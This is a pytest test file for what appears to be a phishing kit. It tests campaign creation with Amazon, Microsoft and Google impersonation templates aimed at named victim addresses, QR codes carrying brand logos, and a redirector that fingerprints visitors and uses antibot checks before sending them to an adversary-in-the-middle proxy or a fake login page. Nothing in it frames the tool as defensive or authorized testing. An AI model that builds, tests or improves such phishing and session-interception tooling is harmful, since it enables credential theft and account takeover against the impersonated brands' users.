import pytest
import os
import json
from unittest.mock import MagicMock, patch, AsyncMock
from fastapi import Request
from core.social.manager import SocialEngineeringManager
from core.redirect.smart_redirector import SmartRedirector
from core.social.templates import TemplateLoader

@pytest.fixture
def mock_redis():
    """Mock Redis cache to store data in memory."""
    storage = {}
    mock = MagicMock()
    
    def set_side_effect(key, value, expire=None):
        storage[key] = json.loads(json.dumps(value)) # Simulate serialization
        return True
        
    def get_side_effect(key):
        return storage.get(key)
        
    mock.set.side_effect = set_side_effect
    mock.get.side_effect = get_side_effect
    return mock

@pytest.fixture
def social_manager(mock_redis):
    with patch("core.social.manager.redis_cache", mock_redis):
        # We also need to patch QRLinkSystem to avoid real file generation if desired,
        # but for now let's let it generate to verify file existence, 
        # just redirect output to a temp dir or ensure we clean up.
        # Actually, let's mock QR generation to speed up tests and avoid FS clutter.
        with patch("core.social.manager.QRLinkSystem") as MockQR:
            instance = MockQR.return_value
            instance.generate_qr.return_value = (True, "QR Generated") # Success
            
            manager = SocialEngineeringManager()
            # Ensure templates are loaded even if mocked
            if not manager.templates:
                manager.templates = TemplateLoader.load_all()
            yield manager

@pytest.fixture
def redirector(mock_redis):
    with patch("core.redirect.smart_redirector.redis_cache", mock_redis):
        with patch("core.redirect.smart_redirector.session_manager") as mock_sm:
            with patch("core.redirect.smart_redirector.antibot") as mock_antibot:
                mock_sm.create_session.return_value = "sess_test_123"
                mock_antibot.check_request = AsyncMock(return_value={"blocked": False})
                
                redirector = SmartRedirector()
                redirector.session_manager = mock_sm
                redirector.antibot = mock_antibot
                yield redirector

def test_campaign_creation_and_template_loading(social_manager):
    """Test creating a campaign and ensuring template is loaded."""
    # Ensure templates are loaded
    assert "amazon" in social_manager.templates
    
    # Create campaign
    campaign = social_manager.create_campaign(
        name="Amazon Phishing",
        template_id="amazon",
        target_email="victim@company.com",
        campaign_type="template"
    )
    
    assert campaign["id"] is not None
    assert campaign["template_id"] == "amazon"
    assert campaign["target_email"] == "victim@company.com"
    assert "qr_code_path" in campaign
    
    # Verify campaign is in redis (via social_manager.get_campaign which uses redis)
    stored_campaign = social_manager.get_campaign(campaign["id"])
    assert stored_campaign is not None
    assert stored_campaign["name"] == "Amazon Phishing"

@pytest.mark.asyncio
async def test_full_redirection_flow(social_manager, redirector, mock_redis):
    """
    Test the full flow:
    1. Campaign Created
    2. User hits Redirect URL -> Smart Redirector (Redirect.html)
    3. User sends Fingerprint -> Smart Redirector (Validation) -> Final Destination
    """
    # 1. Create Campaign
    campaign = social_manager.create_campaign(
        name="Microsoft AiTM",
        template_id="microsoft",
        campaign_type="aitm"
    )
    campaign_id = campaign["id"]
    
    # 2. Simulate Request to Smart Redirector
    # Mock Request object
    scope = {"type": "http", "client": ("1.2.3.4", 12345), "headers": [(b"user-agent", b"Mozilla/5.0")]}
    request = Request(scope)
    
    # Process Request
    response = await redirector.process_request(request, campaign_id)
    
    # Should return HTMLResponse (redirect.html) with status 200
    assert response.status_code == 200
    # Check if content contains campaign_id and session_id injected
    body = response.body.decode()
    assert f'content="{campaign_id}"' in body
    assert 'content="sess_test_123"' in body # From mock_sm
    
    # 3. Simulate Fingerprint Verification
    session_id = "sess_test_123"
    fingerprint_data = {
        "user_agent": "Mozilla/5.0",
        "screen_width": 1920,
        "screen_height": 1080,
        "color_depth": 24,
        "timezone_offset": 0,
        "language": "en-US",
        "platform": "Win32",
        "touch_support": False,
        "fonts_detected": ["Arial"],
        "mouse_movements": 10,
        "scroll_events": 5,
        "time_on_page": 1000,
        "webgl_vendor": "Google Inc.",
        "webgl_renderer": "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
        "canvas_hash": "hash123"
    }
    
    # Real fingerprint validator verification
    # We want to ensure our data passes the real validation logic
    result = await redirector.verify_fingerprint(session_id, fingerprint_data, campaign_id)
    
    # Should return redirect to AiTM proxy (since campaign type is 'aitm')
    # Logic in SmartRedirector._get_final_destination:
    # if type == "aitm": return /v5/p/{session_id}/
    assert result["redirect_to"] == f"/v5/p/{session_id}/"

@pytest.mark.asyncio
async def test_template_campaign_redirection(social_manager, redirector, mock_redis):
    """Test flow for a standard template phishing campaign."""
    # 1. Create Campaign
    campaign = social_manager.create_campaign(
        name="Google Standard",
        template_id="google",
        campaign_type="template"
    )
    campaign_id = campaign["id"]
    
    # 2. Simulate Request (skip to verification for brevity)
    session_id = "sess_test_456"
    fingerprint_data = {
        "user_agent": "Mozilla/5.0",
        "screen_width": 1920,
        "screen_height": 1080,
        "color_depth": 24,
        "timezone_offset": 0,
        "language": "en-US",
        "platform": "Win32",
        "touch_support": False,
        "fonts_detected": ["Arial"],
        "mouse_movements": 10,
        "scroll_events": 5,
        "time_on_page": 1000,
        "webgl_vendor": "Google Inc.",
        "webgl_renderer": "ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
        "canvas_hash": "hash123"
    }
    
    # Real fingerprint validator verification
    result = await redirector.verify_fingerprint(session_id, fingerprint_data, campaign_id)
    
    # Logic in SmartRedirector._get_final_destination:
    # default: /v5/phish/{campaign_id}/login?sid={session_id}
    expected_url = f"/v5/phish/{campaign_id}/login?sid={session_id}"
    assert result["redirect_to"] == expected_url

def test_template_rendering_with_context(social_manager):
    """Verify that templates are rendered correctly with context."""
    # Create a campaign
    campaign = social_manager.create_campaign(
        name="Context Test",
        template_id="amazon",
        target_email="ceo@target.com"
    )
    
    # Render template via manager
    content = social_manager.get_template_content(campaign["id"])
    
    # Check for context injection
    assert "ceo@target.com" in content
    assert "Amazon" in content # Should be in the Amazon template title or body

def test_logo_mapping_logic(social_manager):
    """Test that the correct logo is selected for a campaign."""
    # 1. Amazon (Standard mapping)
    social_manager.create_campaign("Amazon Test", "amazon", use_logo=True)
    
    # Check if generate_qr was called
    assert social_manager.qr_system.generate_qr.called
    args, kwargs = social_manager.qr_system.generate_qr.call_args
    config = kwargs.get('config')
    
    assert config is not None
    assert config.logo_path is not None
    assert config.logo_path.endswith("amazon.png")
    
    # 2. Microsoft (Standard mapping)
    social_manager.create_campaign("Microsoft Test", "microsoft", use_logo=True)
    args, kwargs = social_manager.qr_system.generate_qr.call_args
    config = kwargs.get('config')
    assert config.logo_path is not None
    # Microsoft might be png or svg depending on filesystem, we check if either is found
    # But since we are mocking generate_qr, we just check what _get_logo_path found
    # Based on LS, microsoft.png exists
    assert "microsoft.png" in config.logo_path or "microsoft.svg" in config.logo_path
